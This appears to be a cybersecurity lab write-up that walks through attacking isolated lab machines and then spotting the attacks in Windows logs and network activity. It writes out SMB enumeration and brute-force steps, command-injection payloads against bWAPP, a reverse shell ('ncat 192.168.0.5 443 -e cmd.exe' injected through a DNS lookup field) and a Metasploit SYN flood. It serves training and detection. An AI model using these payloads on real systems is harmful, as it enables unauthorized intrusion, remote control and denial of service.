# Analzying-Malcious-Activity

## Objective

In this project, we will focus on developing key cybersecurity skills by identifying and responding to indicators of network and application attacks. The module provides hands-on experience with recognizing the signs of brute force attacks, command injections, and SYN flood network attacks.

### Skills Learned

- Nmap
- Perform SMB Enumeration and Login Attempt
- Conduct and Observe a Scripted Brute Force Attack
- Conduct Command Injection
- Create a Reverse Shell through Command Injection
- Observe Normal Activity
- Conduct and Observe a SYN Flood Attack
  

### Tools Used

- Virtual Machine
- Kali Linux
- Command Prompt
- Task Manager
  

## Steps

## Exercise 1 - Observe Indications of a Brute Force Attack
Server Message Block (SMB) is a network protocol used in Microsoft Windows operating systems for sharing files, printers, and other resources. Attacks on the SMB protocol can lead to compromised systems, stolen data, and network disruptions.
In this exercise, you will simulate an attack and enumerate SMB, then conduct a brute force attack on it. As a network defender, you will then observe and recognize the attack in Windows Event Viewer.



1. Start by logging into ACIDM01
<img src="https://i.imgur.com/AsmCJBM.png"/>

2. Click the Start charm and type the following: event viewer
Select Event Viewer from the Best match pop-up menu.
<img src="https://i.imgur.com/X6jcMFc.png"/>

3. In the Event Viewer, select the Security logs.
<img src="https://i.imgur.com/9AJjbJ0.png"/>
Note: Observe there are no logs present. As this exercise continues, this will be the location you will refer to for SMBServer Security logs.

4. Connect to ACIKALI. Click the Terminal Emulator icon on the Taskbar.
<img src="https://i.imgur.com/lsCmrKb.png"/>

5. In the Terminal window, type the following and press Enter: nmap -Pn 192.168.0.2
<img src="https://i.imgur.com/zeE33vH.png"/>
Note: As an attacker, these steps walk through the enumeration of ACIDM01.
The “-Pn” switch is required for the ACI lab infrastructure and results in namp forgoing the host discovery ping and assuming the target is alive, which in this case is correct.
When the Nmap scan is complete, observe the open ports and find ports 139 and 445 are open, both associated with SMB.

6. In the Terminal window, type the following and press Enter: enum4linux 192.168.0.2
<img src="https://i.imgur.com/aWdetbo.png"/>
Note: The Linux tool enum4linux is used to enumerate information from Windows and Samba. Notice in the output known usernames that include administrator, guest, krbtgt, etc.

7. In the Terminal window, type the following and press Enter: smbclient //192.168.0.2/administrator
<img src="https://i.imgur.com/CHRICKe.png"/>
Note: The smbclient tool enables communication and connection with SMB workstations.

8. In the Terminal window, type the following and press Enter: Passw0rd
<img src="https://i.imgur.com/kgP8h0e.png"/>

9. Connection via SMB requires a password; the password entered is a guess and is incorrect.
<img src="https://i.imgur.com/YnZ6JVO.png"/>

10. Connect to ACIDM01. In the Event Viewer, right-click on Security and select Refresh.
<img src="https://i.imgur.com/l4K2ROJ.png"/>
Once the logs are refreshed, observe the Errors that appear as a result of the single failed login attempt. In the General tab of a selected error, observe, in the third error down (may differ on your results), that the attempted login originated from 192.168.0.5 and was the result of a bad username or authentication information.
<img src="https://i.imgur.com/eCktrKC.png"/>

**Leave the devices in their current state and proceed to the next task.**

## Task 2 - Conduct and Observe a Scripted Brute Force Attack
Attackers will often automate their attacks. An SMB brute force attack occurs when an attacker attempts to gain unauthorized access to the service by systematically guessing credentials through the SMB protocol.
In this task, you will conduct a scripted SMB brute force attack.

1. Connect to ACIDM01, where the Event Viewer window is open. In the Event Viewer, right-click on Security and select Clear Log.
<img src="https://i.imgur.com/QpmH2Q3.png"/>

2. In the Event Viewer pop-up window, select Save and Clear.
<img src="https://i.imgur.com/kJpChwF.png"/>

3. In the Save As dialog box, type the following in the File name field: failed_login. Click Save.
<img src="https://i.imgur.com/gWyOzAJ.png"/>

4. Connect to ACIKALI, where the Terminal window is open. In the Terminal window, type the following and press Enter:
cd Documents/Module_5_Folder
<img src="https://i.imgur.com/Oz1iril.png"/>
Note: Within this directory is a script that will be used to conduct a short brute-force attack on the SMB protocol.

5. In the Terminal window, type the following and press Enter: cat brute.sh
<img src="https://i.imgur.com/1oXuxKZ.png"/>
Note: Observe the script and find that it is a bash script that iterates through the numbers 0 through 20 as passwords to the smbclient connection command. Additionally, at each log-on attempt, it outputs to the screen the password that was attempted. An attacker’s brute force attack would likely include an algorithm that iterates through all possible combinations of passwords rather than just the numbers 0 through 20.

6. In the Terminal window, type the following and press Enter: ./brute.sh
<img src="https://i.imgur.com/pN86iPa.png"/>
Note: After the script is run, observe that for all connection attempts, access was denied.

7. Connect to ACIDM01. In the Event Viewer, right-click on Security logs and select Refresh.
<img src="https://i.imgur.com/0dGkbl4.png"/>

8. Observe the errors in the logs due to the brute force script.
<img src="https://i.imgur.com/qWyeSO2.png"/>
Close the Event Viewer window.

## Exercise 2 - Conduct Command Injection and Observe Indications
Command injection occurs when an attacker can manipulate the input fields of an application to execute unintended operating system commands. This vulnerability is enabled by a failure to validate or sanitize user input before using it to construct and execute system commands. In this exercise, you will conduct a command injection of the BWAPP application and achieve a reverse shell to ACIKALI.

## 	Task 1 - Conduct Command Injection
	Command injection vulnerabilities can exist in both Linux and Windows systems. While the vulnerabilities share similar characteristics, there are some differences in how command injection attacks can be executed on each of these types of operating systems. In this task, you will conduct a command injection and discover the host operating system and installed tools.

1. Connect to ACIDM01. Click the Start charm and select XAMPP > XAMPP Control Panel.
<img src="https://i.imgur.com/hTjUXIU.png"/>

2. In the XAMPP Control Panel, select Start for the Apache service.
<img src="https://i.imgur.com/20AQvQB.png"/>

3. In the XAMPP Control Panel, select Start for the MySQL service.
<img src="https://i.imgur.com/bC4Xen5.png"/>

4. Close the XAMPP Control Panel.
<img src="https://i.imgur.com/hcDWebS.png"/>

5. Connect to ACIKALI. Select Firefox on the Taskbar.
<img src="https://i.imgur.com/ILDPsXa.png"/>

6. In Firefox, type the following into the address bar and press Enter: http://192.168.0.2/bwapp
<img src="https://i.imgur.com/JNVEwGu.png"/>

7. In the bwapp application, enter the following into the Login field: bee
<img src="https://i.imgur.com/27ZMx6c.png"/>

8. In the bwapp application, enter the following into the Password field: bug
<img src="https://i.imgur.com/kIrUhzO.png"/>

9. In the bwapp application, select medium from the Set the security level drop-down menu.
<img src="https://i.imgur.com/6FwvRNn.png"/>

10. In the bwapp application, select Login.
<img src="https://i.imgur.com/6FwvRNn.png"/>

11. In the Save login for http://192.168.0.2? pop-up, click Don’t save.
<img src="https://i.imgur.com/eMUPW1f.jpeg"/>

12. In the bwapp application Portal, select OS Command Injection from the Which bug do you want to hack today? list.
<img src="https://i.imgur.com/Ql4M8g5.png"/>

13. In the bwapp application Portal, click Hack.
<img src="https://i.imgur.com/gTO2NOi.png"/>
Note: At the OS Command Injection page, observe there is a DNS lookup field that is pre-filled out with www.nsa.gov and a Lookup button. This field is likely susceptible to Command Injection.

14. In the OS Command Injection page, select Lookup.
<img src="https://i.imgur.com/AEohBJi.png"/>
Note: A DNS lookup output is displayed below the input field. If this field is susceptible to Command Injection, this will be the location of any additional command output. In order to understand what commands may be available, you will first discover whether Command Injection is possible, then determine whether the accepted commands are Windows or Linux-based.

15. In the bwapp OS Command Injection page, type the following in the DNS lookup field, then click Lookup: www.nsa.gov&netstat -n
<img src="https://i.imgur.com/K1hewxX.png"/>
Note: There are several command separators that may work. “&”, “&&”, and “|” are command separators that may be acceptable on both Windows and Linux machines. You will use these first to determine whether there is a Command Injection vulnerability. Additionally, you will use the “netstat -n” command because it is an acceptable command in both Windows and Linux. In this case, the “&” command separator does not work.

16. In the bwapp OS Command Injection page, type the following in the DNS lookup field, then click Lookup:
www.nsa.gov&&netstat -n
<img src="https://i.imgur.com/9XtbOPC.png"/>
Note: Notice this is also unsuccessful.

17. In the bwapp OS Command Injection page, type the following in the DNS lookup field, then click Lookup:
www.nsa.gov|netstat -n
<img src="https://i.imgur.com/fJi60Ji.png"/>
Note: Observe from the output that the pipe “|” command separator is accepted. Next, you will determine whether Windows or Linux commands are accepted.

18. In the bwapp OS Command Injection page, type the following in the DNS lookup field, then click Lookup:
www.nsa.gov|hostnamectl
<img src="https://i.imgur.com/CQHDrnF.png"/>
Note: The hostnamectl command is a Linux-specific command. Since no output is given, this is not likely a Linux machine.

19. In the bwapp OS Command Injection page, type the following in the DNS lookup field, then click Lookup:
www.nsa.gov|systeminfo
<img src="https://i.imgur.com/dwa2Lm9.png"/>
Note: This command is accepted. Observe that the machine hosting the bwapp application is identified as a Windows Server. This determines the types of commands that will work in the command injection.

20. In the bwapp OS Command Injection page, type the following in the DNS lookup field, then click Lookup:
www.nsa.gov|whoami
<img src="https://i.imgur.com/4hmaMkZ.png"/>
Note: Observe that the Command Injection is run as aciplab|administrator. Next, you will determine if there are any tools installed on the host that can be used for further exploitation.

21. In the bwapp OS Command Injection page, type the following in the DNS lookup field, then click Lookup:
www.nsa.gov|nmap --version
<img src="https://i.imgur.com/honLDHb.png"/>
Note: Observe that nmap is installed. As part of the nmap installation package, ncat may also be installed, which could be used for further exploitation.

22. In the bwapp OS Command Injection page, type the following in the DNS lookup field, then click Lookup:
www.nsa.gov|ncat -h
<img src="https://i.imgur.com/KzDyBMA.png"/>

23. This command works and indicates that ncat is installed on the host machine. Ncat is an enhanced version of netcat that provides a wide range of capabilities for network communication, including banner grabbing, file transfers, and creating shells.
<img src="https://i.imgur.com/5lGA0Fy.png"/>
**Leave the Firefox window open on the bwapp OS Command Injection page.**

## Task 2 - Create a Reverse Shell through Command Injection
A reverse shell is a type of shell that is initiated from a target host back to the attacker’s machine. It is often used as a post-exploitation technique in cyber-attacks to gain remote access to a compromised system. The term reverse indicates the direction of initiated communication when establishing the shell. In this case, the communication initiates from the victim as a connection is established with the attacker’s machine.
In this task, you will establish a reverse shell through command injection.

1. Connect to ACIKALI. Click the Terminal Emulator icon on the Taskbar.
<img src="https://i.imgur.com/OdAKzWA.png"/>

2. In the Terminal window, type the following and press Enter: ncat -h
<img src="https://i.imgur.com/rUJWjDQ.png"/>
Note: Through Command Injection, it has been determined that ncat is installed on the bwapp host. In order to create a reverse shell, ncat must all be installed on the attack machine (ACIKALI). This test reveals that ncat is not installed on ACIKALI.

3. In the Terminal window, type the following and press Enter: sudo apt install ncat
<img src="https://i.imgur.com/xaNtaCl.png"/>
Note: If the command fails, please execute the following command:
sudo apt-get update
When prompted, enter the following password:
Passw0rd

4. In the Terminal window, type the following and press Enter: Passw0rd
<img src="https://i.imgur.com/GQ9LCtY.png"/>

5. In the Terminal window, type the following and press Enter: ncat -lvp 443
<img src="https://i.imgur.com/BtEszQP.png"/>
Note: This command establishes an ncat listener on the ACIKALI machine, port 443. The -l switch establishes a listening mode, the -v switch sets verbosity, and the -p switch specifies the port to listen on. The next step is to initiate a connection from the bwapp host machine via command injection.

6. On the Taskbar, select the bWAPP - OS Command Injection - Firefox window.
<img src="https://i.imgur.com/KSwNawZ.jpeg"/>

7. In the bwapp OS Command Injection page, type the following in the DNS lookup field, then click Lookup:
www.nsa.gov|ncat 192.168.0.5 443 -e cmd.exe
<img src="https://i.imgur.com/vMsa4bl.png"/>
Note: This ncat command connects to the host 192168.0.5 on port 443 and executes (using the -e switch) cmd.exe (which is a command shell).

8. On the Taskbar, select the Terminal.
<img src="https://i.imgur.com/NFKRmAk.png"/>

9. Observe in the Terminal that a connection has been made from 192.168.0.2. This is a reverse shell.
In the Terminal window, type the following and press Enter: whoami
<img src="https://i.imgur.com/OCajCz0.png"/>

10. Observe that the command shell is operating as aciplab\administrator.
<img src="https://i.imgur.com/o35d5Cc.png"/>
Note: Next, you will observe the indications of the connection on ACIDM01.

11. Connect to ACIDM01. Click the Start charm and type the following: cmd
<img src="https://i.imgur.com/c1IX07K.png"/>

12. In the Command Prompt window, type the following and press Enter: netstat -n
<img src="https://i.imgur.com/kcy2Pxz.png"/>

13. Observe there is an ESTABLISHED connection between the local host (192.168.0.2) to a remote machine (192.168.0.5) on port 443. This is the attacker shell. Close the Command Prompt window.

14. Connect to ACIKALI, and close the Terminal and Firefox windows.
<img src="https://i.imgur.com/rj6gksZ.png"/>


## Exercise 3 - Observe Indications of a SYN Flood Attack
A SYN flood attack is a type of DoS attack that targets the TCP handshake process. A TCP connection is initiated by a client sending a SYN packet to a server. The server responds and initiates the connection (via a SYN/ACK) and establishes the connection when the client responds with a final ACK packet. In a SYN flood attack, an attack machine sends a large and continuous number of SYN requests to the victim. The victim machine responds by initiating a connection and waiting for the connecting host to complete the connection. In a SYN flood attack, the attack machine never completes the TCP handshake process, which can lead to the victim’s server resources being overwhelmed, resulting in a DoS. In this exercise, as an attacker, you will use the Metasploit Framework to conduct a SYN flood attack. Then, as a network defender, you will observe the indications of the SYN flood attack.


## Task 1 - Observe Normal Activity
As a cybersecurity practitioner, it is essential to understand what normal network activity and communications look like. This enables the identification of abnormal and potentially malicious activity. In this task, you will observe normal Windows Task Manager and Netstat activity.

1. Connect to ACIDM01. Click the Start charm and type the following: task manager Select Task Manager from the Best match pop-up menu.
<img src="https://i.imgur.com/7OMWRmJ.png"/>

2. In the Task Manager, select More details.
<img src="https://i.imgur.com/f2gme7o.png"/>

3. In the Task Manager, select the Performance tab.
<img src="https://i.imgur.com/610iNX4.png"/>

4. In the Task Manager - Performance tab, select Ethernet on the left pane.
<img src="https://i.imgur.com/tWSij4U.png"/>
Note: Observe normal activity: low kbps Receive, and approximately (or below) 50 Kbps Send activity. Next, you will view normal netstat activity.

5. Click the Start charm and type the following: cmd Select Command Prompt from the Best match pop-up menu.
<img src="https://i.imgur.com/QDnqxqa.png"/>

6. In the Command Prompt window, type the following and press Enter: netstat -n
<img src="https://i.imgur.com/xGEvm15.png"/>

7. Notice the normal netstat activity for this device.
<img src="https://i.imgur.com/TVmbNi2.png"/>

**Keep the Command Prompt and Task Manager windows open on ACIDM01.**

## Task 2 - Conduct and Observe a SYN Flood Attack
The Metasploit Framework is an open-source exploitation tool. It provides a comprehensive suite of tools for identifying vulnerabilities, testing security measures, and simulating cyber-attacks in controlled environments.
In this task, as an attacker, you will use the Metasploit Framework to launch a SYN flood attack. Then, as a defender, you will observe the indications of attack.

1. Connect to ACIKALI. On the desktop Taskbar, select the Terminal Emulator.
<img src="https://i.imgur.com/qdOCvG3.png"/>

2. In the Terminal window, type the following and press Enter: sudo msfconsole
<img src="https://i.imgur.com/wSchfHz.png"/>
Note: This command starts the Metasploit Framework, a modular attack framework that will be used to launch an attack on ACIDM01 that can be observed.

3. In the Terminal window, type the following and press Enter: Passw0rd
<img src="https://i.imgur.com/jQaRoUK.png"/>

4. In the Terminal window, type the following and press Enter: search synflood
<img src="https://i.imgur.com/WK9iIfO.png"/>
Note: This command (at the msf6 prompt) searches the Metasploit Framework for synflood modules. Observe that one result is returned: auxiliary/dos/tcp/synflood. Also, notice that this module is provided a module number of “0” in this search output.

5. In the Terminal window, type the following and press Enter: use 0
<img src="https://i.imgur.com/4R19Zov.png"/>
Note: This command identifies the synflood module for use.

6. In the Terminal window, type the following and press Enter: show options
<img src="https://i.imgur.com/9EhAAU7.png"/>
Note: This command displays the configuration choices and requirements for using the selected module. Observe that RHOSTS is required but not set and that RPORT is set for port 80. The “R” in RHOSTS and RPORT stands for remote and identifies the machine that will be attacked.

7. In the Terminal window, type the following and press Enter: set RHOSTS 192.168.0.2
<img src="https://i.imgur.com/iOOYaah.png"/>

8. In the Terminal window, type the following and press Enter: set RPORT 445
<img src="https://i.imgur.com/oHn6WWT.png"/>
Note: Recall from Exercise 1 that SMB on port 445 is open on the ACIDM01 machine. This is the port that will be attacked. Next, before launching the attack, you will prepare ACIDM01 to observe the attack.

9. Connect to ACIDM01. Restore the Task Manager window from the Taskbar.
<img src="https://i.imgur.com/tsVWPXH.png"/>
Note: The Ethernet selection in the Performance tab of the Task Manager will be the first location to notice the attack.

10. Connect to ACIKALI.
In the Terminal window, type the following and press Enter: run
<img src="https://i.imgur.com/4imChED.png"/>

11. Connect to ACIDM01. Notice the activity in the Ethernet performance in the Task Manager.
<img src="https://i.imgur.com/jCVZsUR.png"/>
Note: Observe the immediate increase in Receive communication, up to approximately 500 kbps and an increase in Send communication, up to approximately 2Mbps. This is due to the SYN flood attack launched from ACIKALI. Note that the scale of the Ethernet throughput graph will quickly change and will no longer appear at the maximum rate.

12. Restore the Command Prompt window from the Taskbar.
<img src="https://i.imgur.com/QiDMU1p.png"/>

13. In the Command Prompt window, type the following and press Enter: netstat -n
<img src="https://i.imgur.com/MWkh56r.png"/>
Note: Observe the many connections to the 192.168.0.2 machine on port 445 that have a connection status of SYN_RECEIVED. This is the SYN flood attack completing step 1 of the TCP handshake.

14. In the Command Prompt, press the Ctrl+C keys to stop the netstat output. Close the Command Prompt window.
<img src="https://i.imgur.com/kNsDcHT.png"/>

15. Close the Task Manager window.
<img src="https://i.imgur.com/vdj1gRP.png"/>

16. Connect to ACIKALI. In the Terminal window, press the Ctrl+C keys to stop the SYN flood attack. Close the Terminal window.
<img src="https://i.imgur.com/TK34ZTX.png"/>

## Review
Well done, you have completed the Analyze Malicious Activity Practice Lab. As you have discovered, indicators of compromise and attack play a pivotal role in the security of an enterprise network and the integrity of sensitive information. Organizations must be able to analyze potential malicious and malicious activity to identify threats, respond effectively, and continuously improve their security posture.





